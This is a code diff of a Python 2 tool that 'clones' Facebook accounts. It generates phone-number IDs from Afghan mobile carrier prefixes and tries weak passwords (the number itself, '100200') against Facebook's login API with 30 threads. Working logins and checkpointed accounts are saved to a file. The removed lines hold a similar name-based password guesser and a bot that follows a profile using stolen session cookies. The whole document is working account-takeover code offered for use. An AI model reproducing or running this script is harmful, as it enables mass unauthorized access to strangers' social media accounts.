+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            blackmafiax()
+
+    elif peak == '5':
+        os.system('clear')
+        os.system('figlet -f small Etisalat |lolcat')
+        try:
+            c = raw_input('\x1b[1;96mplz click Enter')
+            k = '078'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            blackmafiax()
+
+    elif peak == '6':
+        os.system('clear')
+        os.system('figlet -f small Etisalat Mirror |lolcat')
+        try:
+            c = raw_input('\x1b[1;96mplz click Enter')
+            k = '073'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            blackmafiax()
+
+    elif peak == '7':
+        os.system('clear')
+        os.system('figlet -f small Salaam |lolcat')
+        try:
+            c = raw_input('\x1b[1;96mplz click Enter')
+            k = '074'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            blackmafiax()
+
+    elif peak == '8':
+        os.system('clear')
+        os.system('figlet -f small Afghan Telecom |lolcat')
+        try:
+            c = raw_input('\x1b[1;96mplz click Enter')
+            k = '075'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            blackmafiax()
+
+    elif peak == '9':
+        os.system('clear')
+        os.system('figlet -f small MTN Telecom |lolcat')
+        try:
+            c = raw_input('\x1b[1;96mplz click Enter')
+            k = '077'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            blackmafiax()
+
+    elif peak == '10':
+        os.system('clear')
+        os.system('figlet -f small MTN  Mirror |lolcat')
+        try:
+            c = raw_input('\x1b[1;96mplz click Enter')
+            k = '076'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            blackmafiax()
+            
+    elif peak == '11':
+        os.system('clear')
+        os.system('toilet -f future Subscribe Me --youtube')
+        os.system('xdg-open https://youtu.be/lZWzKurhMi4')
+        os.system('exit')
+    elif peak == '00':
+        login()
+    else:
+        print '[!] Fill In Correctly'
+        action()
+    print 50 * '\x1b[1;91m-'
+    xxx = str(len(id))
+    jalan('\x1b[1;91m[\x1b[1;93m\xe2\x9c\x93\x1b[1;91m]\x1b[1;92m Total ids number: ' + xxx)
+    jalan('\x1b[1;91m[\x1b[1;93m\xe2\x9c\x93\x1b[1;91m]\x1b[1;92m Process is Starting...')
+    jalan('\x1b[1;91m[\x1b[1;93m\xe2\x9c\x93\x1b[1;91m]\x1b[1;92m To Stop Process Press Ctrl+z')
+    print 50 * '\x1b[1;91m-'
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;91m[\x1b[1;92mHEMAT KHANSuccesful\x1b[1;91m]   ' + k + c + user + '  |  ' + pass1
+                okb = open('save/cloned.txt', 'a')
+                okb.write(k + c + user + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[\x1b[1;96mHEMAT KHANChekpoint\x1b[1;91m] ' + k + c + user + '  |  ' + pass1
+                cps = open('save/cloned.txt', 'a')
+                cps.write(k + c + user + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+            else:
+                pass2 = k + c + user
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;91m[\x1b[1;92mHEMAT KHANSuccesful\x1b[1;91m]   ' + k + c + user + '  |  ' + pass2
+                    okb = open('save/cloned.txt', 'a')
+                    okb.write(k + c + user + pass2 + '\n')
+                    okb.close()
+                    oks.append(c + user + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;91m[\x1b[1;96mHEMAT KHANChekpoint\x1b[1;91m] ' + k + c + user + '  |  ' + pass2
+                    cps = open('save/cloned.txt', 'a')
+                    cps.write(k + c + user + pass2 + '\n')
+                    cps.close()
+                    cpb.append(c + user + pass2)
                 else:
-                    continue
-
-            loop+=1
+                    pass3 = '100200'
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;91m[\x1b[1;92mHEMAT KHANSuccesful\x1b[1;91m]   ' + k + c + user + '  |  ' + pass3
+                        okb = open('save/cloned.txt', 'a')
+                        okb.write(k + c + user + pass3 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;91m[\x1b[1;96mHEMAT KHANChekpoint\x1b[1;91m] ' + k + c + user + '  |  ' + pass3
+                        cps = open('save/cloned.txt', 'a')
+                        cps.write(k + c + user + pass3 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass3)
         except:
-            self.__metode__(user, pw, cebok)
-#    <- Bot followers ->
-    def follow(self,session,coki):
-        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100065533669299",cookies={"cookie":coki}).text,"html.parser")
-        get = r.find("a",string="Ikuti").get("href")
-        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text
+            pass
 
-    def __pler__(self):
-        chi = ('3')
-        if chi == '':
-            print('\nSelect Correct One');self.__pler__()
-        elif chi in ('1', '01'):
-            os.system('clear')
-            logo()
-            print('')
-            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
-            print(' \033[1;97mYour Process Started in Background')
-            print('-------------------------------------------')
-            print('')
-            with BilalBSN(max_workers=30) as kirim:
-                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
-                    try:
-                        uid, name = yntkts.split('|')
-                        xz = name.split(' ')
-                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
-                        else:
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
-                        kirim.submit(self.__api__, uid, pwx)
-                    except:
-                        pass
-
-            hasil(ok,cp)
-        elif chi in ('2', '02'):
-            os.system('clear')
-            logo()
-            print('')
-            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
-            print(' \033[1;97mYour Process Started in Background')
-            print('-------------------------------------------')
-            print('')
-            with BilalBSN(max_workers=30) as kirim:
-                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
-                    try:
-                        uid, name = yntkts.split('|')
-                        xz = name.split(' ')
-                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
-                        else:
-                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
-                        kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
-                    except:
-                        pass
-
-            hasil(ok,cp)
-        elif chi in ('3', '03'):
-
-            os.system('clear')
-            logo()
-            print('')
-            print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
-            print(' \033[1;97mYour Process Started in Background')
-            print('-------------------------------------------')
-            print('')
-            with BilalBSN(max_workers=30) as kirim:
-                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
-                    try:
-                        uid, name = yntkts.split('|')
-                        xz = name.split(' ')
-                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name,xz[0]+'1234',xz[0]+'1234',xz[0]+'12345',xz[0]+'786']
-                        else:
-                            pwx = [name,xz[0]+'1234',xz[0]+'1234',xz[0]+'12345',xz[0]+'786']
-                        kirim.submit(self.__metode__, uid, pwx, "m.facebook.com")
-                    except:
-                        pass
-
-            hasil(ok,cp)
-        else:
-            print('\n Select Valid One');self.__pler__()
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50 * '\x1b[1;91m-'
+    print 'Aryan_HackProcess Has Been Completed\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92...100%'
+    print 'Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
+    print 'Saadat HACK.TM Cloned Accounts Has Been Saved : save/cloned.txt'
+    print ''
+    print '\n    \n    \n    \n    \n\n\x1b[1;91mThanks \x1b[1;97mUseing My CLONE FB Tool\n\x1b[1;92m My Telegram\x1b[1;97m@t.me/hemt_hack\n\x1b[1;93mGitHub\x1b[1;97mHemtKhan\n\x1b[1;94mInstagram\x1b[1;97m\xe2\x88\x86@\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97'
+    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
+    login()
 
 
 if __name__ == '__main__':
-    reg()
+    login()
